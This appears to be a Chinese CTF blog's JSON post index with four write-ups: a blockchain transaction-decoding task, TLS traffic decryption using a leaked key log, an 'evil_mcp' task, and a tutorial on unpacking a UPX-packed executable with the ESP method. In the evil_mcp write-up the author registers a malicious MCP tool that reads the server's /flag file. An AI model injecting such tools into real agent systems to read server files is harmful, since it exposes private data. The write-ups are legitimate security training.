[{"title":"Block-chain Signln","url":"/2025/10/28/Blockchain  SignIn/","content":"\n# ***Block-chain  Signln***\n\n<from geekchallenge>\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251029163022356.png)\n\n题目给了我们区块hash，我们可以查询~***[TESTNET Sepolia (ETH) Blockchain Explorer](https://sepolia.etherscan.io/)***\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251029163110698.png)\n\n根据hash查询交易信息\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251029163114779.png)\n\n这里click to SHOW MORE\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251029163120495.png)\n\n发现一个INPUT DATA是hex转一下，得到flag。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251029163124653.png)\n\n☆*: .｡. o(≧▽≦)o .｡.:*☆《~☆~》*: .｡. o(≧▽≦)o .｡.:*☆ ","tags":["CTF"],"categories":["Blockchain"]},{"title":"traffic 1","url":"/2025/10/28/GFSJ_traffic1/","content":"# ***traffic 1***\n\n*<from Gfsj_misc_Traffic Analysis>*\n\n有tcp无http，怀疑tls\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103420190.png)\n\n过滤tls\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103424488.png)\n\n大量tlsv1.2协议。\n\n发现Encrypt字段，怀疑解密。\n\n搜索key没有发现，再看了看发现有ftp协议，看看什么模式。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103428217.png)\n\n不管了直接搜ftp-data协议（主动模式下无ftp-data数据包，被动模式有）\n\n传输了大量key.log文件\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103428217.png)\n\n追踪流。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103432448.png)\n\n每一行都以 `CLIENT_RANDOM` 开头，后面跟着两个长串的十六进制字符串。这是典型的 **TLS（传输层安全协议）密钥日志格式**，用于解密  加密流量。\n\n我们导出保存为key.log\n\n之后对加密流量包解密。进入***编辑 → 首选项 → 协议 → TLS***\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103436331.png)\n\n点击应用完成解密。如果解密不成功可以试试把debug file添加上。\n\n解密成功。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103439925.png)\n\n导出http。\n\n文件有点多，我们可以选择可疑的导出。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103443960.png)\n\n这里有个zip导出一下。发现是一个音频。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103448382.png)\n\n尾部有噪音。Audacity打开。\n\n频谱图看一下尾部。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103452336.png)\n\n发现是key不是flag，说明我们遗漏了什么东西。回头看看。\n\n不管了，这里直接binwalk+foremost一下。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103457987.png)\n\n分理出2个压缩包。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103503383.png)\n\n输入刚才的key\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103507403.png)\n\n得到flag：***flag{4sun0_y0zora_sh0ka1h@n_#>><<#}***\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030103512520.png)\n\n○( ＾皿＾)っHiahiahia…","tags":["CTF"],"categories":["Forensics"]},{"title":"evil_mcp","url":"/2025/10/28/evil_mcp/","content":"# ***evil_mcp***\n\n*<from geekchallenge>*\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030105202206.png)\n\n**ez_AI**：打开环境\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030105205382.png)\n\n*这里思路是编写一个脚本注入获取flag*\n\n```\nfrom typing import Any\n\n@tool(\n    name=\"get_flag\",\n    description=\"Get the flag from the server\",\n    input_schema={\n        \"type\": \"object\",\n        \"properties\": {},\n        \"required\": []\n    }\n)\nasync def get_flag(arguments: dict[str, Any], context: Any) -> Any:\n    \"\"\"Get the flag.\"\"\"\n    with open('/flag', 'r') as f:\n        content = f.read()\n    return content\n```\n\n粘贴进MCP工具代码框，保存并加载工具。\n\n最后get_flag就行。\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030105210043.png)\n\n☆*: .｡. o(≧▽≦)o .｡.:*☆喔耶!\n","tags":["CTF"],"categories":["AI"]},{"title":"ESP定律","url":"/2025/10/28/脱壳ESP（扩展栈指针）定律/","content":"# ***ESP（扩展栈指针）***\n\n***principle：***\n\n*在程序执行过程中，栈的操作与函数调用、局部变量存储等密切相关。当程序执行到某个函数调用时，会将函数的参数、返回地址等信息压入栈中，而 ESP 则始终指向栈顶。****X86 exp寄存器存储的是当前栈顶的内存地址。***\n\n***Function：***\n\nESP 定律的核心原理基于栈的平衡机制。在一些情况下，特别是在加密程序或存在代码保护机制的软件中，程序可能会对自身代码进行加密或混淆处理，使得直接分析原始代码变得困难。然而，**当程序执行到特定关键代码段（如解密后的代码部分）时，通常会涉及到栈的操作，导致 ESP 的值发生有规律的变化**。通过**监测 ESP 的值变化，我们可以找到这些关键代码的执行点**。\n\n***CPP：***\n\n```\n`#include <iostream>`\n\n`void encryptedFunction() {`\n`// 这里假设是一些加密后的代码逻辑`\n`std::cout << \"This is the encrypted part of the code.\" << std::endl;`\n`}`\n\n`int main() {`\n`// 调用加密函数前的栈状态`\n`int localVar1 = 10;`\n`int localVar2 = 20;`\n\n\nencryptedFunction();\n\n// 调用加密函数后的栈状态\nstd::cout << \"After the function call, localVar1: \" << localVar1 << \", localVar2: \" << localVar2 << std::endl;\n\nreturn 0;\n\n}\n```\n\n\n\n***个人理解（仅供参考）：***\n\n*ESP（扩展栈指针）*：对于调用函数等操作，在对关键代码进行定位查找的困难过程中，可以通过观察ESP的值进行对函数地址的定位，比如程序在调用**encryptedFunction**函数时，会涉及到栈的操作，导致 ESP 的值发生有规律的变化。通过监测 ESP 的值变化，我们可以找到这些关键代码的执行点。\n\n\n\n\n\n***Example：***\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104434071.png)\n\n\n\n**我创建了一个简单的PE文件，并对其进行基础加壳upx -d  project1.exe**\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104438830.png)\n\n\n\n**接着对upx特征段进行篡改使其无法被基础脱壳掉。如下图**：\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104443152.png)\n\n\n\n\n\n**然后针对此类加壳我们可以用esp定律进行动态调试来完成脱壳。**\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104446580.png)\n\n\n\n\n\n首先单步调试，发现ESP寄存器出大红（**ESP 寄存器变红表示栈指针（Stack Pointer）的值发生了异常或不一致，可能触发了栈平衡错误。**）\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104449794.png)\n\n\n\n\n\n**将内存窗口的显示定位到与该寄存器值相关的内存地址处，方便查看对应内存地址中的数据。**\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104453237.png)\n\n\n\n\n\n**任意字符下硬件断点**\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104456305.png)\n\n\n\n\n\n**run to line(jmp project.6c1023)，找到[OEP]（ 程序的入口点 ）**\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104459583.png)\n\n\n\n\n\n**设置EIP，收工。**\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104503551.png)\n\n\n\n\n\n**最后dump下来，检验一下。**\n\n![img](https://raw.githubusercontent.com/HuA-m1/Pic%20/main/pic/20251030104507280.png)\n\n**脱壳成功！**🙌🙌🙌","tags":["CTF"],"categories":["Reverse"]}]